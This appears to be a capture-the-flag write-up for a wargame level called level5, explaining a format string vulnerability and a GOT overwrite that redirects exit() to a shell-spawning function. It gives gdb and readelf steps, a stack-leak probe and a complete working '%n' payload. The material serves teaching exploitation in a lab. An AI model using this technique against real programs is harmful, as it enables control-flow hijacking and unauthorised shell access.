# level5
- This program has the same vulnerability as the previous two levels: __format string vulnerability__., 
- `main()` calls `n()` then returns.
- `n()` finishes calling `exit()`. it is a subroutine that doen't return. So we can't overwrite the return address of `n`
- A function named `o` runs a shell, but is never called

## Goal
Modify the call of `exit()` by the call of `o()`

## Step 1
`exit()` is called through the __PLT (Procedure Linkage Table)__ resolution. __PLT__ link code to the __GOT__
```console
Dump of assembler code for function n:
   [...]
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```

It's mean that `exit` is a dependecy of the program (extern). `exit()` is bind to the program thanks to the __PLT__ and __GOT__ mechanism (same for libc)
> *the purpose is to reduce size of the binary.*  

__GOT__ is a table of addresses where we can find the dependencies addresses.


Since __PIE__ is disabled, the __GOT__ is always at the same address.


## Step 2

```bash
(gdb) p &o
$1 = (<text variable, no debug info> *) 0x80484a4 <o>
--- OR ---
objdump -t level5
080484a4 g     F .text	0000001e              o
```
`o` is at `0x80484a4`

---

```bash
$ readelf -r level5 | grep exit
08049828  00000207 R_386_JUMP_SLOT   00000000   _exit
08049838  00000607 R_386_JUMP_SLOT   00000000   exit
```

The __GOT__ stores  the __address__ of `exit` at `0x8049838`

### Notice
*seen early*
```console
0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```  
> 0x80483d0 is not the address of `exit`, it's the address of the __PLT__ entry of `exit`

> 0x8049838 is not the address of `exit`, it's the address of the __GOT__ entry where the address of `exit` is stored 

## Step 3
Lets try to overwrite the __GOT__ entry of `exit` with the address of `o`

```bash
$ gdb level5
(gdb) b *main
(gdb) r
(gdb) set {int}0x8049838=0x80484a4
(gdb) c
$ whoami
level5
(gdb)
```

It works, we have a shell with the user `level5` privileges. (gdb run with the same privileges as the user, not the SUID bit permissions)


## Step 4

We have to leaks the memory until we reach the address of `exit()`

```bash
(python -c 'print "AAAA " + "%x " * 10000'; cat)  | /home/user/level5/level5 | grep 8049838
```
We never reach the address of `exit()`. But we reach the buffer

```bash
(python -c 'print "AAAA " + "%x " * 16'; cat)  | /home/user/level5/level5
```
```console
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
```

Buffer is at the 4th position

## Exploit


- Write the __GOT__'s address which store `exit` in the buffer.
- Write 134513828 characters total. 134513828 is the decimal value for the address `o()`
- Access to the buffer through the __4th__ specifier
- Write the total printed characters in the pointer of `exit` with `%n`.



```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'; cat)  | /home/user/level5/level5
```
